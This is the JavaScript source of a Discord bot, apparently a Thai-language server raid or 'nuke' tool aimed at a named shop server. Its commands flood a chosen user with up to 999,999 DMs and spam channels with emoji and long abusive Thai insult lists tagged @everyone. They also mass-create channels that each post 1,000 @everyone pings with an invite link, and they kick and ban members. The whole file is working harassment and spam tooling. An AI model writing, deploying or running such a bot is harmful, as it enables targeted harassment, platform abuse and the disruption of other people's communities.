import {
  Client,
  GatewayIntentBits,
  ChannelType,
  PermissionsBitField
} from "discord.js";

import { joinVoiceChannel } from "@discordjs/voice";
import "dotenv/config";

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
});

// ===== CONFIG =====
const LOG_CHANNEL_ID = "1461588208675459217";
const BLOCKED_GUILD_ID = "146024011876123456";

// ===== ANGPAO CONFIG =====
const ANGPAO_LINK = "https://gift.truemoney.com/campaign/?v=067e13y095402q4tlg4032te7w204h4afk  https://gift.truemoney.com/campaign/?v=025e18y092902q4tlg6832te2w703h7afk. https://gift.truemoney.com/campaign/?v=030e89y038251q4tlg5921te6q703h9afk. https://gift.truemoney.com/campaign/?v=030e89y305392q4tlg1042te9w301h4afk. https://gift.truemoney.com/campaign/?v=063e10y50395q4tlg1042te9w301h9afk"; // 👈 เปลี่ยนเป็นลิงก์เว็บอังเปาของมึง

// ===== RANDOM TEXT =====
const randomMessages = [
  "@everyone # ไม่ต้องพูดไรเยอะถือว่าเรารู้มื๊อออออ~",
  "จะวัดอะไรก็ได้เเต่ไม่ใช่วัดเรื่องวาสนามึงไปหาหมอได้เลยกูว่าสมองมึงมีปัญหาเเละเงินกูมีเป็นปึกเเม่งใช้ไม่หมดเเละโครตจะหนาเเล้วพวกกูเกิดที่ISREALถ้ามึงข้องใจก็เข้ามาหากูต่อให้มึง7ร้อย7ข้ามกี่100กี่ข้ามมหาสมุทรมึงก็ยังตามพวกกูไม่ทันเพราะรัศมีกูสูงที่สุดกูมีทุกอย่างที่มึงต้องการกูมีทุกอย่างที่มึงไม่มีเเล้วมึงอย่าหวังจะเทียบกูได้ถ้าพวกมึงเป็นเเค่วันนาบีปักธงน้ำเงินขึ้นกลางอร่ามลมหนาวสีครามเหนือเเสงขยายหยงชุนไปทั่วทวีปให้ชื่อเสียงกูอยู่ทั่วทุกที่เขาบอกว่ากูเป็นNever dieเเต่กูจะตายเเละฟื้นคืนชีพเเละเข็มกัดเเชมป์มันอยู่ที่เอวเพราะพวกกูคือwinterfell",
  "@everyone # ไอ้แหวกกอหญ้า ไอ้บ้าห้าร้อยจำพวก ไอ้ปลวกใต้หลังคา ไอ้หน้าปลาจวด ไอ้กรวดท้องร่อง ไอ้บ้องกัญชา ไอ้ปลาไม่กินเบ็ด ไอ้เห็ดสามสี ไอ้ชะนีสามรส ไอ้ตดเสียงดัง ไอ้ทั่งตีเหล็ก ไอ้เด็กปัญญาอ่อน ไอ้นอนเกา ไอ้กะโหลกซออู้ ไอ้กู่ไม่กลับ ไอ้ตับย่างเกลือ ไอ้เชื้ออหิวาต์ ไอ้ม้าขี้ครอก ไอ้หอกขึ้นสนิม ไอ้ขิมสายขาด ไอ้ชาติสุนัข ไอ้ตะหวักตะบวย ไอ้กล้วยตากแห้ง ไอ้แกงฟักทอง ไอ้ชาติสุนัข ไอ้ตะหวักตะบวย ไอ้กล้วยตากแห้ง ไอ้แกงฟักทอง ไอ้ชาติสุนัข ไอ้ตะหวักตะบวย ไอ้กล้วยตากแห้ง ไอ้แกงฟักทอง ไอ้กระชุก้นรั่ว ไอ้หัวองคชาต ไอ้กระจาดปลาแห้ง ไอ้แทงไม่เข้ารู ไอ้ปลาทูแม่กลอง ไอ้สององคต ไอ้หดหัวในกระฎอง ไอ้สมองเท่าเมล็ดถั่ว ไอ้ตัวกินไก่ ไอ้ใจปลาซิว ไอ้หิวตลอดศก ไอ้ซกมกเป็นนิจสิน ไอ้หินใต้บาดาล ไอ้สันดานนักเลง ไอ้เพลงผิดคีย์ ไอ้สีทาบ้าน ไอ้จานเปื้อนคราบ ไอ้แมลงสาบทรงเครื่อง ไอ้เปลืองข้าวสุก ไอ้กระปุกตังไฉ่ ไอ้ไหปลา- ไอ้คนแบกกุ้ง ไอ้ถุงข้าวเปลือก ไอ้เศือกทุกงาน ไอ้มารสังคม ไอ้ผ้าห่มสีซีด ไอ้ศพไม่ฉีดฟอร์มาลิน ไอ้กระถินริมรั้ว ไอ้สาคูน้ำกะทิ ไอ้กะปิค้างคืน ไอ้หื่นเป็นสันดาน ไอ้ขวานผ่าซาก ไอ้กากสิ่งปฏิกูล ไอ้พะยูนตากแดด ไอ้แรดสองนอ ไอ้จอหนังตะลุง ไอ้ถุงสองใบ ไอ้ไข่ลูกเดียว ไอ้เคียวห่วยๆ ไอ้ถ้วยสังขยาบูด ไอ้ฉลาดแต่เรื่องโง่ ไอ้โมฆบุรุษ ไอ้มนษย์สามานย์ ไอ้เชี่ยวชาญแต่เรื่องชั่ว ไอ้กระต่ายขูดมะพร้าว ไอ้ชาวสวนทุเรียน ไอ้ตะเพียนหางยาว ไอ้ว่าวหางขาด ไอ้แกงคั่วหอยขม ไอ้นิยมแต่เรื่องผิด ไอ้จิตวิปลาส ไอ้ทาสเงินตรา ไอ้ชฎายอดหัก ไอ้ไม้หลักปักขี้เลน ไอ้จิ้งเหลนหางไหม้ ไอ้แกงคั่วหอยขม ไอ้นิยมแต่เรื่องผิด ไอ้จิตวิปลาส ไอ้ทาสเงินตรา ไอ้ตาเถรตกใต้ถุน ไอ้เนรคุณแผ่นดินเกิด ไอ้ระเบิดแสวงเครื่อง ไอ้ครกกระเดื่องตำข้าว ไอ้มะพร้าวห้าวยัดปาก ไอ้สากกระเบือยัดก้น ไอ้คนไททิ้งแผ่นดิน ไอ้วินมอเตอร์ไซค์",
];

// ===== RANDOM ROOM NAMES =====
const roomNames = [
  "ไม่เป็นไรนะสร้างใหม่ได้",
  "เซิฟแตกเหรอครับ",
  "เอ๋อจัดๆ",
  "ตลกดี 555",
  "สร้างใหม่ได้จ้า",
  "ร้องทำไมมม",
  "ป๊อปปี้อย่าร้อง",
  "เซิฟวิบัติ",
  "ปัดเป่าสิ่งชั่วร้าย",
  "สู้ป๊อปปี้สู้",
  "ดิสกากๆโดนบอทฟรียิง",
  "VEXSHOPเขามาลั่นมึงเเล้ววว",
  "มึงพลาดเเล้วววว",
  "จุ๊บมั่วววว",
  "ตู้มมมมพ่องตายยยยย",
  "บอทกันสเเปมมึงเซ็ตโง่มาก555",
  "ขี้ตีนVEXSHOP",
];

// ===== FORMAT TIME +7 =====
function timeTH() {
  return new Date().toLocaleString("th-TH", { timeZone: "Asia/Bangkok" });
}

// ===== LOG SYSTEM =====
function logUse(i, extra = "") {
  if (!LOG_CHANNEL_ID) return;
  const ch = client.channels.cache.get(LOG_CHANNEL_ID);
  if (!ch) return;
  ch.send(
    `[\`${timeTH()}\`] ${i.user.tag} ใช้คำสั่ง \`/${i.commandName}\` ในเซิฟ \`${i.guild.name}\` ${extra}`
  ).catch(() => {});
}

client.once("ready", () => {
  console.log(`${client.user.tag} is online.`);
});

client.on("interactionCreate", async (interaction) => {
  try {
    if (!interaction.isChatInputCommand()) return;
    if (!interaction.guild) return;

    if (BLOCKED_GUILD_ID && interaction.guild.id === BLOCKED_GUILD_ID) {
      return interaction.reply({ content: "อย่ามาใช้ในเซิฟกู", ephemeral: true });
    }

    logUse(interaction);

    // =======================
    // /angpao  ⭐ เพิ่มใหม่
    // =======================
    if (interaction.commandName === "angpao") {
      await interaction.reply({
        content:
          "🧧 **อังเปาพิเศษสำหรับคุณ**\n" +
          "คลิกเพื่อเปิดอังเปาเยยยย 👇\n" +
          "🔗 " + ANGPAO_LINK
      });

      logUse(interaction, "-> angpao");
    }

    // =======================
    // /dm
    // =======================
    if (interaction.commandName === "dm") {
      const target = interaction.options.getUser("target");
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 1, 999999);

      await interaction.reply({ content:`ยิง DM ไปที่ ${target.tag} x${count}`, ephemeral:true });

      let success = 0, fail = 0;
      for (let i = 0; i < count; i++) {
        await target.send(text).then(()=>success++).catch(()=>fail++);
      }

      interaction.followUp({
        content: `ยิง DM เสร็จแล้ว ✔️ สำเร็จ: ${success}  ไม่เข้า: ${fail}`,
        ephemeral: true
      });

      logUse(interaction, `-> DM ${target.tag} (ok:${success} fail:${fail})`);
    }

    // =======================
    // /spam
    // =======================
    if (interaction.commandName === "spam") {
      const text = interaction.options.getString("text");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      await interaction.reply({ content: "ลั่นละนะ", ephemeral: true });
      for (let i = 0; i < count; i++) interaction.channel.send(text).catch(()=>{});
    }

    // /emoji
    if (interaction.commandName === "emoji") {
      const emoji = interaction.options.getString("emoji");
      const count = Math.min(interaction.options.getInteger("count") ?? 5, 999999);
      const delay = Math.max(interaction.options.getInteger("delay") ?? 1, 1);
      await interaction.reply({ content: "ยิง emoji", ephemeral: true });
      for (let i = 0; i < count; i++) {
        interaction.channel.send(emoji).catch(()=>{});
        await new Promise(r => setTimeout(r, delay));
      }
    }

    // /join
    if (interaction.commandName === "join") {
      const vc = interaction.member.voice?.channel;
      if (!vc)
        return interaction.reply({ content: "มึงเข้า vc ก่อนไอ้ควาย", ephemeral: true });
      joinVoiceChannel({
        channelId: vc.id,
        guildId: vc.guild.id,
        adapterCreator: vc.guild.voiceAdapterCreator,
        selfDeaf:false,selfMute:false
      });
      return interaction.reply({ content:`เข้าห้อง ${vc.name} แล้ว`, ephemeral:true });
    }

    // /tell_off
    if (interaction.commandName === "tell_off") {
      const count = interaction.options.getInteger("count") ?? 100000;
      await interaction.reply({ content:`ยิง ${count} ข้อความ`, ephemeral:true });
      const tasks = [];
      for (let i = 0; i < count; i++) {
        tasks.push(
          interaction.channel.send(
            randomMessages[Math.floor(Math.random()*randomMessages.length)]
          ).catch(()=>{})
        );
      }
      Promise.allSettled(tasks);
    }

    // /kick
    if (interaction.commandName === "kick") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      const mem = interaction.guild.members.cache.get(target.id);
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.KickMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Kick", ephemeral:true });
      await mem.kick(reason).catch(()=>{});
      logUse(interaction, `-> Kick ${target.tag}`);
      return interaction.reply({ content:`Kick ${target.tag}`, ephemeral:true });
    }

    // /ban
    if (interaction.commandName === "ban") {
      const target = interaction.options.getUser("target");
      const reason = interaction.options.getString("reason") ?? "No reason";
      if (!interaction.member.permissions.has(PermissionsBitField.Flags.BanMembers))
        return interaction.reply({ content:"บอทกูไม่มีสิทธิ์ Ban", ephemeral:true });
      await interaction.guild.members.ban(target, { reason }).catch(()=>{});
      logUse(interaction, `-> Ban ${target.tag}`);
      return interaction.reply({ content:`Ban ${target.tag}`, ephemeral:true });
    }

    // /create_room
    if (interaction.commandName === "create_room") {
      const amount = interaction.options.getInteger("amount") ?? 1;
      await interaction.reply({
        content:`สร้าง ${amount} ห้อง + ยิงพร้อมกัน`,
        ephemeral:true
      });

      const tasks = [];
      for (let i = 0; i < amount; i++) {
        const name = roomNames[Math.floor(Math.random()*roomNames.length)];
        tasks.push(
          interaction.guild.channels.create({
            name,
            type: ChannelType.GuildText,
            permissionOverwrites:[{
              id: interaction.guild.roles.everyone.id,
              allow:[
                PermissionsBitField.Flags.ViewChannel,
                PermissionsBitField.Flags.SendMessages
              ]
            }],
          }).then(ch=>{
            for (let j = 0; j < 1000; j++)
              ch.send("@everyone ไม่เป็นไรนะสร้างใหม่ได้โอ๋ๆ https://discord.gg/bdtRJBRyem")
                .catch(()=>{});
          }).catch(()=>{})
        );
      }

      Promise.allSettled(tasks);
    }

  } catch (err) {
    console.error("ERROR:", err);
  }
});

client.login(process.env.DISCORD_TOKEN);